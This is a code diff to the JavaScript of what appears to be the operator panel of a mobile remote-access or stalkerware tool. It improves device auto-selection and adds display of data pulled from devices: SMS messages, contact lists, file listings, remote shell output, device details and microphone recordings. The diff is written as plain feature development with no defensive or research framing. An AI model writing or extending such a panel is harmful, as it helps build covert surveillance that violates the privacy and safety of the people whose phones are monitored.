@@ -55,8 +55,11 @@ async function fetchDevs(){
     var d = await r.json();
     deviceData = {};
     (d.devices||[]).forEach(function(x){deviceData[x.id]=x;});
-    if(!activeId || !deviceData[activeId] || !deviceData[activeId].online){
+    if(!activeId || !deviceData[activeId]){
+      // Auto-select: prefer online, fallback to any device
+      activeId = '';
       for(var k in deviceData){if(deviceData[k].online){activeId=k;break;}}
+      if(!activeId){ for(var k in deviceData){activeId=k;break;} }
     }
     renderSidebar();
   }catch(e){}
@@ -112,7 +115,25 @@ function sse(){
   es.onmessage = function(e){
     try{
       var r = JSON.parse(e.data);
-      if(r.data) document.getElementById('output').textContent = r.data;
+      var out = document.getElementById('output');
+      // Try to extract readable data from various response types
+      if(r.payload && r.payload.type === 'sms_list'){
+        out.textContent = 'SMS ('+r.payload.count+'):\n'+JSON.stringify(r.payload.messages,null,2);
+      }else if(r.payload && r.payload.type === 'contacts_list'){
+        out.textContent = 'Contacts ('+r.payload.count+'):\n'+JSON.stringify(r.payload.contacts,null,2);
+      }else if(r.payload && r.payload.type === 'file_list'){
+        out.textContent = 'Files:\n'+JSON.stringify(r.payload.entries,null,2);
+      }else if(r.payload && r.payload.type === 'shell'){
+        out.textContent = 'Shell:\n'+r.payload.stdout;
+      }else if(r.payload && r.payload.type === 'device_info'){
+        out.textContent = 'Device:\n'+JSON.stringify(r.payload,null,2);
+      }else if(r.payload && r.payload.type === 'mic_recording'){
+        out.textContent = 'Mic recording: '+r.payload.duration_seconds+'s, '+r.payload.size_bytes+' bytes';
+      }else if(r.error){
+        out.textContent = 'Error: '+r.error;
+      }else{
+        out.textContent = JSON.stringify(r,null,2);
+      }
     }catch(ex){}
   };
   es.onerror = function(){ setTimeout(sse,2000); };
